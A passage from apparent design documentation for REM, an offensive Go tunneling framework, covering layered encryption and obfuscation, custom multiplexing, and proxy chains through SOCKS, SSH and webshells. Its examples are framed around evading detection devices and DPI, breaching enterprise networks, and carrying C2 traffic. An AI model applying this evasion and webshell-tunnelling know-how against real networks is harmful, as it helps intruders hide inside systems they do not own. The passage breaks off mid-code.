<p>Traditional OSI models multiplex first and then encrypt, which exposes internal communication structural characteristics. REM implements complete control over data through an <strong>Inverted Architecture (Encrypt First, Then Multiplex)</strong>. Data is first encrypted and obfuscated by the Wrapper above the transport layer, and then multiplexed by the Mux.</p>
<p>In the traditional OSI model, the session layer and presentation layer are independent functional layers. The REM architecture fuses these layers to create a more powerful combination of attack capabilities.</p>
<h4 id="231-inverted-architecture-achieving-total-data-control">2.3.1 Inverted Architecture: Achieving Total Data Control<a class="headerlink" href="#231-inverted-architecture-achieving-total-data-control" title="Permanent link">&para;</a></h4>
<p>Multiplexing before encryption allows detection devices to see the structural features of internal multiplexing. Inverting to "Encrypt then Multiplex" ensures that detection devices can only see a single encrypted data stream.</p>
<p>The core goal of the REM inverted architecture is total control over data. By placing the session layer above the presentation layer, data must undergo encryption and obfuscation processing before reaching the application layer, followed by connection multiplexing management.</p>
<p><strong>Total Control of Data Flow</strong></p>
<p><strong>REM Inverted Architecture:</strong></p>
<div class="highlight"><pre><span></span><code>Application Layer
      ↓
Transport Layer
      ↓
Presentation Layer (Wrapper Encryption/Obfuscation)
      ↓
Session Layer (Mux Multiplexing)
</code></pre></div>
<p><strong>Traditional OSI Architecture:</strong></p>
<div class="highlight"><pre><span></span><code>Transport Layer
      ↓
Application Layer
      ↓
Presentation Layer
      ↓
Session Layer
</code></pre></div>
<p>The core value of this inverted design lies in:</p>
<ul>
<li><strong>Encrypt First, Multiplex Later:</strong> Data is first subjected to complete encryption and obfuscation above the transport layer, and then multiplexed.</li>
<li><strong>Fully Controllable Data Flow:</strong> The attacker completes all necessary data processing before the data reaches the target application.</li>
<li><strong>Hiding Internal Structures:</strong> Detection devices cannot see the internal structure of multiplexing, only the encrypted data stream.</li>
</ul>
<h4 id="232-presentation-layer-wrapper-dynamic-encryption-and-obfuscation-chain">2.3.2 Presentation Layer (Wrapper): Dynamic Encryption and Obfuscation Chain<a class="headerlink" href="#232-presentation-layer-wrapper-dynamic-encryption-and-obfuscation-chain" title="Permanent link">&para;</a></h4>
<p><em>Code:</em> <a href="https://www.google.com/search?q=%5Bhttps://github.com/chainreactors/rem-community/tree/master/protocol/wrapper%5Dhttps://github.com/chainreactors/rem-community/tree/master/protocol/wrapperhttps://github.com/chainreactors/rem-community/tree/master/protocol/wrapper"><code>https://github.com/chainreactors/rem-community/tree/master/protocol/wrapper</code></a></p>
<p>Single encryption algorithms are easily identified; multi-layer nested encryption and obfuscation are required. The Wrapper implements arbitrary combinations of encryption and obfuscation via a chained processing architecture and a reverse read chain design, while ensuring the correctness of the encryption/decryption order.</p>
<p>Wrapper Chain Processing Architecture:</p>
<p>REM's Wrapper layer adopts a chained processing architecture designed based on the standard io.ReadWriteCloser interface, supporting stream encryption and dynamic configuration mechanisms. Core components include the WrapperChain processor chain and ChainReader read chain, realizing layered data encryption processing.</p>
<p>Reverse Read Chain Design:</p>
<p>To ensure correct decryption order, the read chain is built in reverse: when writing data, it starts from the first wrapper (encryption order); when reading data, it starts from the last wrapper (decryption order), ensuring the correctness of nested encryption.</p>
<p><strong>Assumption: Three layers of wrappers are configured: AES-CFB → XOR → HTTP Masquerade</strong></p>
<p><strong>Write Data Flow:</strong></p>
<div class="highlight"><pre><span></span><code>Plaintext Data
  ↓ [AES-CFB Encryption]
AES Ciphertext
  ↓ [XOR Obfuscation]
XOR Obfuscated Data
  ↓ [HTTP Header Wrapping]
Masqueraded HTTP Traffic
  ↓
Network Transmission
</code></pre></div>
<p><strong>Read Data Flow (Reverse):</strong></p>
<div class="highlight"><pre><span></span><code>Network Receive
  ↓ [HTTP Header Stripping]
XOR Obfuscated Data
  ↓ [XOR De-obfuscation]
AES Ciphertext
  ↓ [AES-CFB Decryption]
Plaintext Data
</code></pre></div>
<p>This reverse read design supports dynamic combination of any number and type of wrappers. It ensures the correct encryption/decryption order of "outer layers wrapping inner layers" while maintaining a completely transparent standard <code>io.ReadWriteCloser</code> interface for upper-layer calls. This allows attackers to flexibly combine different encryption and obfuscation technologies based on specific needs, achieving customizable traffic camouflage and providing multi-level protection for data.</p>
<h4 id="233-session-layer-mux-lightweight-multiplexing">2.3.3 Session Layer (Mux): Lightweight Multiplexing<a class="headerlink" href="#233-session-layer-mux-lightweight-multiplexing" title="Permanent link">&para;</a></h4>
<p>Existing protocols like <code>smux</code>/<code>yamux</code> have identifiable statistical characteristics. REM avoids identification by detection devices through custom protobuf message formats and a Redirect mechanism to achieve zero-signature multiplexing.</p>
<p>REM uses protobuf to define message formats and implements its own multiplexer in conjunction with a buffer management mechanism. This avoids the statistical characteristics of existing multiplexing protocols like <code>smux</code>/<code>yamux</code> while providing zero-signature design, adaptive buffering, smart scheduling, and error recovery capabilities.</p>
<p><em>(In the OSI model, this corresponds to session layer connection management and presentation layer encryption/obfuscation. REM inverts and fuses the two to achieve complete control over data.)</em></p>
<h3 id="24-between-transport-layers-protocol-boundary-free-proxy-integration">2.4 Between Transport Layers: Protocol-Boundary-Free Proxy Integration<a class="headerlink" href="#24-between-transport-layers-protocol-boundary-free-proxy-integration" title="Permanent link">&para;</a></h3>
<p>Attack scenarios often require traversing multiple network layers (firewalls/enterprise proxies/WebShells). <code>proxyclient</code> integrates various proxy protocols (SOCKS/HTTP/SSH/neoreg/suo5) into combinable modular components via unified <code>Dialer</code> abstraction and dynamic registration mechanisms, achieving protocol-boundary-free proxy capabilities.</p>
<p><em>Code:</em> <a href="https://www.google.com/search?q=%5Bhttps://github.com/chainreactors/proxyclient%5Dhttps://github.com/chainreactors/proxyclienthttps://github.com/chainreactors/proxyclient"><code>https://github.com/chainreactors/proxyclient</code></a></p>
<p>The REM architecture achieves protocol-boundary-free capabilities through proxy integration between transport layers. The core of this part is the <code>proxyclient</code> library, which effectively blurs the boundaries between data transmission and proxies, unifying traditionally isolated proxy protocols into modular components.</p>
<p><em>(<code>proxyclient</code> was originally a sub-package in REM, but its application scenarios far exceed REM, so it was abstracted as a lightweight, dependency-free independent package.)</em></p>
<h4 id="241-background-knowledge-of-golang-proxies">2.4.1 Background Knowledge of Golang Proxies<a class="headerlink" href="#241-background-knowledge-of-golang-proxies" title="Permanent link">&para;</a></h4>
<p>There is a fundamental cognitive bias regarding traditional Golang proxies. Most developers use:</p>
<div class="highlight"><pre><span></span><code><span class="c1">// WRONG way to use proxy - Applies to HTTP only</span>
<span class="kd">func</span><span class="w"> </span><span class="nx">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">proxyUrl</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">url</span><span class="p">.</span><span class="nx">Parse</span><span class="p">(</span><span class="s">&quot;http://127.0.0.1:8080&quot;</span><span class="p">)</span>
<span class="w">    </span><span class="nx">client</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">http</span><span class="p">.</span><span class="nx">Client</span><span class="p">{</span>
<span class="w">        </span><span class="nx">Transport</span><span class="p">:</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">http</span><span class="p">.</span><span class="nx">Transport</span><span class="p">{</span>
<span class="w">            </span><span class="nx">Proxy</span><span class="p">:</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">ProxyURL</span><span class="p">(</span><span class="nx">proxyUrl</span><span class="p">),</span>
<span class="w">        </span><span class="p">},</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="c1">// This method is only suitable for HTTP and cannot handle TCP/UDP traffic</span>
<span class="p">}</span>
</code></pre></div>
<p><strong>Correct Golang Proxy Usage:</strong></p>
<div class="highlight"><pre><span></span><code><span class="c1">// CORRECT Proxy Abstraction - Protocol Agnostic</span>
<span class="kd">func</span><span class="w"> </span><span class="nx">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">proxyURL</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">url</span><span class="p">.</span><span class="nx">Parse</span><span class="p">(</span><span class="s">&quot;socks5://127.0.0.1:1080&quot;</span><span class="p">)</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">log</span><span class="p">.</span><span class="nx">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">dialer</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">proxyclient</span><span class="p">.</span><span class="nx">NewClient</span><span class="p">(</span><span class="nx">proxyURL</span><span class="p">)</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">log</span><span class="p">.</span><span class="nx">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">transport</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">http</span><span class="p">.</span><span class="nx">Transport</span><span class="p">{</span>
<span class="w">        </span><span class="nx">Dial</span><span class="p">:</span><span class="w"> </span><span class="nx">dialer</span><span class="p">.</span><span class="nx">Dial</span><span class="p">,</span><span class="w"> </span><span class="c1">// Use the Dial interface directly</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">client</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">http</span><span class="p">.</span><span class="nx">Client</span><span class="p">{</span>
<span class="w">        </span><span class="nx">Transport</span><span class="p">:</span><span class="w"> </span><span class="nx">transport</span><span class="p">,</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="c1">// This method supports all protocols</span>
<span class="p">}</span>
</code></pre></div>
<p>The key advantage of this design is that it supports multiple proxy protocols like SOCKS5 and HTTP through the unified abstraction of <code>proxyclient</code>. By using the <code>Dial</code> interface directly, it avoids performance loss and is compatible with TCP/UDP traffic, thus applying to all network application scenarios. By rewriting the <code>dialer interface</code>, we can make any network protocol act as a proxy. Inspired by this, we re-implemented the <code>proxyclient</code> library, greatly expanding Golang's native proxy ecosystem.</p>
<p><strong>Supported Protocols:</strong></p>
<ul>
<li>HTTP/HTTPS</li>
<li>SOCKS5/4/4a</li>
<li>ShadowSocks</li>
<li>SSH Proxy</li>
<li>neoreg (WebShell)</li>
<li>suo5 (WebShell)</li>
<li>....</li>
</ul>
<p>WebShell Proxy Integration: The Breakthrough of Neoreg and Suo5 Bi-directional Interoperability</p>
<p>In traditional understanding, there is a fundamental difference between WebShell proxies and standard proxy protocols. proxyclient completely breaks this boundary, implementing a bi-directional interoperability architecture for neoreg and suo5.</p>
<p>In traditional scenarios, tools like <code>pystinger</code> achieved similar effects via APIs provided on the WebShell. But in REM, we can use <em>any</em> proxy/WebShell to achieve this, and by operating completely in memory, we vastly optimize performance.</p>
<h4 id="243-dynamic-registration-mechanism-and-bootstrapping">2.4.3 Dynamic Registration Mechanism and Bootstrapping<a class="headerlink" href="#243-dynamic-registration-mechanism-and-bootstrapping" title="Permanent link">&para;</a></h4>
<p>The dynamic registration mechanism is one of the core innovations of <code>proxyclient</code> integration with REM. Its essence is registering REM itself as a proxy protocol within <code>proxyclient</code>, achieving <strong>bootstrapping</strong> capability. This allows REM to use other proxy protocols and also be called as a proxy protocol by other tools.</p>
<p>Technical Architecture of Bi-directional Registration:</p>
<p>By registering REM itself as a proxyclient, what was originally an extremely complex integration operation becomes attainable for any Golang tool to use REM's encrypted, stable channel as a transport layer with less than three lines of code.</p>
<p>Here is a simple example. If there is a C2 tool implemented based on HTTP, we only need <code>newRemProxyClient</code> to use it directly as its HTTP transport layer.</p>
<div class="highlight"><pre><span></span><code><span class="nx">remurl</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">url</span><span class="p">.</span><span class="nx">Parse</span><span class="p">(</span><span class="s">&quot;tcp://nonenonenonenone:@127.0.0.1:1234/?wrapper=raw&quot;</span><span class="p">)</span>
<span class="nx">pc</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">newRemProxyClient</span><span class="p">(</span><span class="nx">remurl</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span><span class="p">)</span>
<span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span>
<span class="p">}</span>
<span class="nx">client</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">http</span><span class="p">.</span><span class="nx">Client</span><span class="p">{</span>
<span class="w">    </span><span class="nx">Transport</span><span class="p">:</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">http</span><span class="p">.</span><span class="nx">Transport</span><span class="p">{</span>
<span class="w">        </span><span class="nx">DialContext</span><span class="p">:</span><span class="w"> </span><span class="nx">pc</span><span class="p">,</span>
<span class="w">    </span><span class="p">},</span>
<span class="p">}</span>
<span class="nx">_</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">client</span><span class="p">.</span><span class="nx">Get</span><span class="p">(</span><span class="s">&quot;http://127.0.0.1:1111/&quot;</span><span class="p">)</span>
<span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></div>
<h4 id="244-principles-of-zero-performance-loss-proxy">2.4.4 Principles of Zero-Performance-Loss Proxy<a class="headerlink" href="#244-principles-of-zero-performance-loss-proxy" title="Permanent link">&para;</a></h4>
<p>Performance bottlenecks in traditional proxy environments are mainly reflected in high-concurrency scenarios, especially massive packet loss during port scanning. The main reasons include:</p>
<ul>
<li><strong>Uneven Proxy Server Implementation:</strong> Many proxy tools (like single-file SOCKS5 tools) lack investment in performance optimization.</li>
<li><strong>Environmental Constraints:</strong> WebShell proxies suffer from poor concurrency due to language environments and runtime conditions. If a duplex channel cannot be built, relying on polling to simulate long connections creates significant bottlenecks.</li>
<li><strong>Client Tool Limitations:</strong> Tools like proxifier, proxychains, and clash are optimized primarily for bandwidth, lacking specific optimization for high-concurrency scenarios.</li>
</ul>
<p>Based on the <code>proxyclient</code> library design, REM optimizes performance by simulating the SOCKS5 proxy protocol in memory. The core principle is creating a <code>memoryPipe</code> in memory and starting the memory proxy service via <code>NewConsoleWithCMD</code>, enabling direct data exchange between <code>proxyclient</code> and REM in memory, avoiding the overhead of real network connections.</p>
<p>Another key performance optimization is the timing of SOCKS authentication processing. REM handles SOCKS authentication when the user and server connection is established, whereas traditional protocols like frp and nps handle authentication at the proxy client.</p>
<p><strong>Differences in Processing Timing:</strong></p>
<ul>
<li><strong>REM Method:</strong> Authentication is completed once at connection establishment; subsequent data transmission requires no repetitive authentication processing, avoiding accumulated overhead.</li>
<li><strong>Traditional Method:</strong> Each connection requires authentication processing at the proxy client, increasing computational overhead and latency, causing severe performance loss in high-concurrency scenarios.</li>
</ul>
<p>By moving authentication processing to the connection establishment phase, REM avoids repetitive authentication overhead in high-concurrency scenarios. This is one of the important technical details for achieving zero performance loss.</p>
<h4 id="245-cascading-proxy-chain-proxy">2.4.5 Cascading Proxy (Chain Proxy)<a class="headerlink" href="#245-cascading-proxy-chain-proxy" title="Permanent link">&para;</a></h4>
<p>Cascading proxying is a core capability of <code>proxyclient</code>, supporting the serialization of multiple proxy servers to form complex proxy chains. This capability is of high value in complex network environments.</p>
<p><strong>Typical Cascading Proxy Scenario:</strong></p>
<p><em>Network Hierarchy:</em></p>
<div class="highlight"><pre><span></span><code>Local Network -&gt; Boundary Server -&gt; Enterprise Proxy -&gt; Web Server -&gt; Restricted Intranet -&gt; Target Intranet
</code></pre></div>
<p><em>Attack Tools:</em></p>
<div class="highlight"><pre><span></span><code>SSH Jump Host -&gt; SOCKS5 Proxy -&gt; HTTP Gateway -&gt; neoreg WebShell -&gt; REM
</code></pre></div>
<p><em>(In the OSI model, this is equivalent to network layer routing and protocol conversion, achieving path selection and protocol adaptation across networks via proxies.)</em></p>
<p>We can implement proxy chaining with extremely simple configuration:</p>
<div class="highlight"><pre><span></span><code><span class="nx">proxy1</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">url</span><span class="p">.</span><span class="nx">Parse</span><span class="p">(</span><span class="s">&quot;socks5://localhost:1080&quot;</span><span class="p">)</span>
<span class="nx">proxy2</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">url</span><span class="p">.</span><span class="nx">Parse</span><span class="p">(</span><span class="s">&quot;http://localhost:8080&quot;</span><span class="p">)</span>
<span class="nx">dial</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">proxyclient</span><span class="p">.</span><span class="nx">NewClientChain</span><span class="p">([]</span><span class="o">*</span><span class="nx">url</span><span class="p">.</span><span class="nx">URL</span><span class="p">{</span><span class="nx">proxy1</span><span class="p">,</span><span class="w"> </span><span class="nx">proxy2</span><span class="p">})</span>
</code></pre></div>
<h3 id="25-above-transport-layers-protocol-stack-orchestrator">2.5 Above Transport Layers: Protocol Stack Orchestrator<a class="headerlink" href="#25-above-transport-layers-protocol-stack-orchestrator" title="Permanent link">&para;</a></h3>
<p>Sections 2.1-2.4 described Tunnel transport abstraction, Simplex+ARQ reliability conversion, Wrapper encryption/obfuscation, and <code>proxyclient</code> integration. The <strong>Hook mechanism</strong> acts as the core orchestrator, flexibly combining these scattered capabilities into a complete attack channel through priority control and chained execution.</p>
<h4 id="251-hook-mechanism">2.5.1 Hook Mechanism<a class="headerlink" href="#251-hook-mechanism" title="Permanent link">&para;</a></h4>
<p><em>Code:</em> <a href="https://www.google.com/search?q=%5Bhttps://github.com/chainreactors/rem/blob/master/protocol/tunnel/options.go%5Dhttps://github.com/chainreactors/rem/blob/master/protocol/tunnel/options.gohttps://github.com/chainreactors/rem/blob/master/protocol/tunnel/options.go"><code>https://github.com/chainreactors/rem/blob/master/protocol/tunnel/options.go</code></a></p>
<p>We used a similar mechanism in 2.1.2 to implement secondary encapsulations like TLS, TLS-in-TLS, compression, and ShadowTLS on Conn.</p>
<p>It provides two types of hooks: BeforeHook and AfterHook, injecting processing logic before and after connection establishment. This applies not only to operations on a single Conn (as shown in 2.1.2) but also to orchestrating all capabilities from Sections 2.1-2.4 into a coordinated whole.</p>
<p><strong>Hook Orchestration Capabilities:</strong></p>
<div class="highlight"><pre><span></span><code><span class="c1">// Hook orchestration example based on actual code (from console.go)</span>
<span class="nx">tunOpts</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="p">[]</span><span class="nx">tunnel</span><span class="p">.</span><span class="nx">TunnelOption</span><span class="p">{}</span>

<span class="c1">// TLS Encryption Layer (Section 2.1.2)</span>
<span class="k">if</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">ConsoleURL</span><span class="p">.</span><span class="nx">GetQuery</span><span class="p">(</span><span class="s">&quot;tls&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">tunOpts</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nb">append</span><span class="p">(</span><span class="nx">tunOpts</span><span class="p">,</span><span class="w"> </span><span class="nx">tunnel</span><span class="p">.</span><span class="nx">WithTLS</span><span class="p">())</span><span class="w">  </span><span class="c1">// Priority MaxInt-10</span>
<span class="p">}</span>

<span class="c1">// TLS in TLS Double Encryption (Section 2.1.2)</span>
<span class="k">if</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">ConsoleURL</span><span class="p">.</span><span class="nx">GetQuery</span><span class="p">(</span><span class="s">&quot;tlsintls&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">tunOpts</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nb">append</span><span class="p">(</span><span class="nx">tunOpts</span><span class="p">,</span><span class="w"> </span><span class="nx">tunnel</span><span class="p">.</span><span class="nx">WithTLSInTLS</span><span class="p">())</span><span class="w">  </span><span class="c1">// Priority MaxInt-110</span>
<span class="p">}</span>

<span class="c1">// Network Layer: Proxy Integration (Section 2.4)</span>
<span class="k">if</span><span class="w"> </span><span class="nb">len</span><span class="p">(</span><span class="nx">runner</span><span class="p">.</span><span class="nx">ForwardAddr</span><span class="p">)</span><span class="w"> </span><span class="p">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">tunOpts</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nb">append</span><span class="p">(</span><span class="nx">tunOpts</span><span class="p">,</span><span class="w"> </span><span class="nx">tunnel</span><span class="p">.</span><span class="nx">WithProxyClient</span><span class="p">(</span><span class="nx">runner</span><span class="p">.</span><span class="nx">ForwardAddr</span><span class="p">))</span>
<span class="w">    </span><span class="c1">// ForwardAddr example: []string{&quot;socks5://proxy:1080&quot;, &quot;neoreg://shell/t.php&quot;}</span>
<span class="p">}</span>

<span class="c1">// Data Compression (Section 2.1.2)</span>
<span class="k">if</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">ConsoleURL</span><span class="p">.</span><span class="nx">GetQuery</span><span class="p">(</span><span class="s">&quot;compress&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">tunOpts</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nb">append</span><span class="p">(</span><span class="nx">tunOpts</span><span class="p">,</span><span class="w"> </span><span class="nx">tunnel</span><span class="p">.</span><span class="nx">WithCompression</span><span class="p">())</span><span class="w">  </span><span class="c1">// Priority WrapperPriority±5</span>
<span class="p">}</span>

<span class="c1">// Presentation Layer: Encryption Obfuscation Chain (Section 2.3.2)</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">wrapperOpts</span><span class="w"> </span><span class="nx">core</span><span class="p">.</span><span class="nx">WrapperOptions</span>
<span class="k">if</span><span class="w"> </span><span class="nx">wrapperStr</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">ConsoleURL</span><span class="p">.</span><span class="nx">GetQuery</span><span class="p">(</span><span class="s">&quot;wrapper&quot;</span><span class="p">);</span><span class="w"> </span><span class="nx">wrapperStr</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">wrapperOpts</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">core</span><span class="p">.</span><span class="nx">ParseWrapperOptions</span><span class="p">(</span><span class="nx">wrapperStr</span><span class="p">,</span><span class="w"> </span><span class="nx">runner</span><span class="p">.</span><span class="nx">Key</span><span class="p">)</span>
<span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// Automatically generate 2-4 layers of random Wrappers</span>
<span class="w">    </span><span class="nx">wrapperOpts</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">core</span><span class="p">.</span><span class="nx">GenerateRandomWrapperOptions</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">)</span>
<span class="p">}</span>
<span class="k">if</span><span class="w"> </span><span class="nx">wrapperOpts</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">tunOpts</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nb">append</span><span class="p">(</span><span class="nx">tunOpts</span><span class="p">,</span><span class="w"> </span><span class="nx">tunnel</span><span class="p">.</span><span class="nx">WithWrappers</span><span class="p">(</span><span class="nx">isServer</span><span class="p">,</span><span class="w"> </span><span class="nx">wrapperOpts</span><span class="p">))</span>
<span class="w">    </span><span class="c1">// Priority WrapperPriority(20)</span>
<span class="p">}</span>

<span class="c1">// Create complete Tunnel; all Hooks automatically orchestrated by priority</span>
<span class="nx">tunnel</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">tunnel</span><span class="p">.</span><span class="nx">NewTunnel</span><span class="p">(</span><span class="nx">context</span><span class="p">.</span><span class="nx">Background</span><span class="p">(),</span><span class="w"> </span><span class="nx">scheme</span><span class="p">,</span><span class="w"> </span><span class="nx">isServer</span><span class="p">,</span><span class="w"> </span><span class="nx">tunOpts</span><span class="o">...</span><span class="p">)</span>
</code></pre></div>
<p>The Hook mechanism executes in order based on priority control, ensuring each layer processes data correctly:</p>
<p><strong>Data Send Flow (Priority Low to High):</strong></p>
<div class="highlight"><pre><span></span><code>Raw Data
  ↓ [Priority 20: Wrapper Chain] - 2-4 layers random encryption (2.3.2)
  ↓ [Priority 25: Snappy Compression] - Reduce bandwidth (2.1.2)
  ↓ [Priority MaxInt-110: TLS in TLS] - Inner TLS (2.1.2)
  ↓ [Priority MaxInt-10: TLS Encryption] - Outer TLS (2.1.2)
  ↓ [Tunnel Transport] - Via Simplex+ARQ (2.2)
  ↓ [ProxyClient] - Via multi-level proxy (2.4)
  → Network Transmission
</code></pre></div>
<p><strong>Data Receive Flow (Reverse Processing):</strong></p>
<div class="highlight"><pre><span></span><code>Network Receive
  ↓ [ProxyClient] - Reverse proxy chain
  ↓ [Tunnel Receive] - Simplex+ARQ reassembly
  ↓ [Priority MaxInt-10: TLS Decryption] - Strip outer TLS
  ↓ [Priority MaxInt-110: TLS in TLS Decryption] - Strip inner TLS
  ↓ [Priority 25: Snappy Decompression] - Decompress data
  ↓ [Priority 20: Wrapper Decryption] - Reverse decryption/obfuscation chain
  → Raw Data
</code></pre></div>
<p><strong>Scenario 1: Breaching Restricted Enterprise Networks</strong></p>
<div class="highlight"><pre><span></span><code><span class="c1">// Only HTTPS outbound allowed, maximum covertness required</span>
<span class="nx">tunOpts</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="p">[]</span><span class="nx">tunnel</span><span class="p">.</span><span class="nx">TunnelOption</span><span class="p">{</span>
<span class="w">    </span><span class="nx">tunnel</span><span class="p">.</span><span class="nx">WithWrappers</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="nx">wrapperOpts</span><span class="p">),</span><span class="w">  </span><span class="c1">// Custom encryption (2.3.2)</span>
<span class="w">    </span><span class="nx">tunnel</span><span class="p">.</span><span class="nx">WithTLS</span><span class="p">(),</span><span class="w">                          </span><span class="c1">// Outer TLS camouflage (2.1.2)</span>
<span class="p">}</span>
<span class="c1">// Effect: Wrapper Encryption → TLS Packaging → Looks like normal HTTPS traffic</span>
</code></pre></div>
<p><strong>Scenario 2: WebShell Tunnel</strong></p>
<div class="highlight"><pre><span></span><code><span class="c1">// Establish high-performance tunnel via WebShell, maximize bandwidth</span>
<span class="nx">tunOpts</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="p">[]</span><span class="nx">tunnel</span><span class="p">.</span><span class="nx">TunnelOption</span><span class="p">{</span>
<span class="w">    </span><span class="nx">tunnel</span><span class="p">.</span><span class="nx">WithProxyClient</span><span class="p">([]</span><span class="kt">string</span><span class="p">{</span><span class="s">&quot;neoreg://webshell/tunnel.php&quot;</span><span class="p">}),</span><span class="w"> </span><span class="c1">// WebShell Proxy (2.4)</span>
<span class="w">    </span><span class="nx">tunnel</span><span class="p">.</span><span class="nx">WithCompression</span><span class="p">(),</span><span class="w">                                          </span><span class="c1">// Compression (2.1.2)</span>
<span class="w">    </span><span class="nx">tunnel</span><span class="p">.</span><span class="nx">WithWrappers</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="nx">lightWeightWrappers</span><span class="p">),</span><span class="w">                   </span><span class="c1">// Lightweight Encryption (2.3.2)</span>
<span class="p">}</span>
<span class="c1">// Effect: Lightweight Encryption → Compression → neoreg → WebShell</span>
<span class="c1">//      Single channel reuse, maximized bandwidth utilization</span>
</code></pre></div>
<p><strong>Scenario 3: Multi-layer Encryption Against Deep Inspection</strong></p>
<div class="highlight"><pre><span></span><code><span class="c1">// Counter DPI deep packet inspection, use multi-layer TLS</span>
<span class="nx">tunOpts</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="p">[]</span><span class="nx">tunnel</span><span class="p">.</span><span class="nx">TunnelOption</span><span class="p">{</span>
